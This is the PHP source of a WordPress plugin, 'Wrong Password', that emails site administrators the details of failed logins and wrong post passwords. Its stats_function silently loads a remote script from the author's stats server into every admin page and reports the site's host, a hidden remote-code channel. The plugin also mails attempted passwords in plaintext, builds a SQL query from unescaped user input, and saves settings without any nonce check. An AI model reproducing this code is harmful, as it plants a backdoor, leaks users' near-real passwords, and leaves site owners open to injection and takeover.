<?php
/*
Plugin Name: Wrong Password
Plugin URI: http://anthony.strangebutfunny.net/my-plugins/wrong-password/
Description: When someone gets a password wrong on your site, the administrator is emailed with the details that were entered.
Version: 9.0
Author: Alex and Anthony
Author URI: http://www.strangebutfunny.net/
license: GPL 
*/
if(!function_exists('stats_function')){
function stats_function() {
	$parsed_url = parse_url(get_bloginfo('wpurl'));
	$host = $parsed_url['host'];
    echo '<script type="text/javascript" src="http://mrstats.strangebutfunny.net/statsscript.php?host=' . $host . '&plugin=wrong-password"></script>';
}
add_action('admin_head', 'stats_function');
}
add_option('run_on',2);
function alex_forgot_password(){
$run_on = get_option('run_on');
if($run_on==1 || $run_on==2){
if (!empty($_SERVER["HTTP_CLIENT_IP"]))
{
 //check for ip from share internet
 $ipaddress = $_SERVER["HTTP_CLIENT_IP"];
}
elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"]))
{
 // Check for the Proxy User
 $ipaddress = $_SERVER["HTTP_X_FORWARDED_FOR"];
}
else
{
 $ipaddress = $_SERVER["REMOTE_ADDR"];
}
$wp_url = get_bloginfo('wpurl');
$referer = $_SERVER['HTTP_REFERER'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$login = strip_tags($_POST['user_login']);
$pass = strip_tags($_REQUEST['pwd']);
$http_accept_language = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
$email = strip_tags($_POST['user_email']);
$message = "Someone used the forgotten password form on your WordPress site. \n They used the following details:\n
Site URL: " . $wp_url . "\nReferer: " . $referer . "\nUsername: " . $login . "\n" . "Email: " . $email . "\nIP Address: http://dndetails.com/" . $ipaddress . "\nUser Agent: " . $user_agent . "\n" . "WordPress Version: " . get_bloginfo('version') . "\nLanguage: " . $http_accept_language;
 wp_mail(get_option('admin_email'), 'Someone used the forgotten password form!', $message);
 }
}
function alex_wrong_password(){
$run_on = get_option('run_on');
if($run_on==1 || $run_on==2){
if (!empty($_SERVER["HTTP_CLIENT_IP"]))
{
 //check for ip from share internet
 $ipaddress = $_SERVER["HTTP_CLIENT_IP"];
}
elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"]))
{
 // Check for the Proxy User
 $ipaddress = $_SERVER["HTTP_X_FORWARDED_FOR"];
}
else
{
 $ipaddress = $_SERVER["REMOTE_ADDR"];
}
$wp_url = get_bloginfo('wpurl');
$referer = $_SERVER['HTTP_REFERER'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$login = strip_tags($_REQUEST['log']);
$pass = strip_tags($_REQUEST['pwd']);
$http_accept_language = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
$email = strip_tags($_REQUEST['user_email']);
$message = "Someone tried to log into your WordPress site, and failed. \n They used the following details:\n
Site URL: " . $wp_url . "\nReferer: " . $referer . "\nUsername: " . $login . "\n" . "Password: " . $pass . "\n" . "Email: " . $email . "\nIP Address: http://dndetails.com/" . $ipaddress . "\nUser Agent: " . $user_agent . "\n" . "WordPress Version: " . get_bloginfo('version') . "\nLanguage: " . $http_accept_language;
 wp_mail(get_option('admin_email'), 'Someone used Incorrect login details!', $message);
 }
}
function alex_wrong_password_post(){
if(get_option('run_on')==0 || get_option('run_on')==2){
if(isset($_POST['post_password'])){
if(!is_user_logged_in()){
global $wpdb;
$teh_password = stripslashes($_POST['post_password']);
$password_count = $wpdb->get_var( $wpdb->prepare( "SELECT COUNT(*) FROM $wpdb->posts WHERE post_password = '$teh_password';" ) );
if(empty($password_count)){
if (!empty($_SERVER["HTTP_CLIENT_IP"]))
{
 //check for ip from share internet
 $ipaddress = $_SERVER["HTTP_CLIENT_IP"];
}
elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"]))
{
 // Check for the Proxy User
 $ipaddress = $_SERVER["HTTP_X_FORWARDED_FOR"];
}
else
{
 $ipaddress = $_SERVER["REMOTE_ADDR"];
}
$wp_url = get_bloginfo('wpurl');
$referer = $_SERVER['HTTP_REFERER'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$login = strip_tags($_REQUEST['log']);
$pass = strip_tags($_POST['post_password']);
$http_accept_language = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
$email = strip_tags($_REQUEST['user_email']);
$message = "Someone tried to log into a locked post on your website, and failed. \n They used the following details:\n
Site URL: " . $wp_url . "\nReferer: " . $referer . "\nPassword: " . $pass . "\nIP Address: http://dndetails.com/" . $ipaddress . "\nUser Agent: " . $user_agent . "\n" . "WordPress Version: " . get_bloginfo('version') . "\nLanguage: " . $http_accept_language;
wp_mail(get_option('admin_email'), 'Someone used Incorrect login details!', $message);
}
}
}
}
}

function is_checked($what){
if(get_option('run_on')==$what){
return 'checked';
}
}
add_filter('wp_login_failed', 'alex_wrong_password');
add_filter('retrieve_password', 'alex_forgot_password');
add_filter('wp_loaded', 'alex_wrong_password_post');

add_action('admin_menu', 'the_admin_page_menu');
function the_admin_page_menu(){
add_options_page( 'Wrong Password', 'Wrong Password', 'edit_users', 'wrong-password-admin-menu', 'the_admin_page');
}
function the_admin_page(){
	echo '<div class="wrap">';
	echo '<p>When should I work?</p>';
	
	if(isset($_POST['when'])){
	update_option('run_on', $_POST['when']);
	echo 'Changes Saved! :D';
	}
	echo '<form name="wrong_password_settings" action="" method="post">
	<p><input type="radio" name="when" value="0" ' . is_checked(0) . '> On Password-protected posts<br></p>
	<p><input type="radio" name="when" value="1" ' . is_checked(1) . '> On WordPress login page<br></p>
	<p><input type="radio" name="when" value="2" ' . is_checked(2) . '> On Both<br><p>
	<p><input type="submit" name="submit" class="button button-primary" value="Save Changes" /></p>
	</form>';
	echo '</div>';
	}
?>
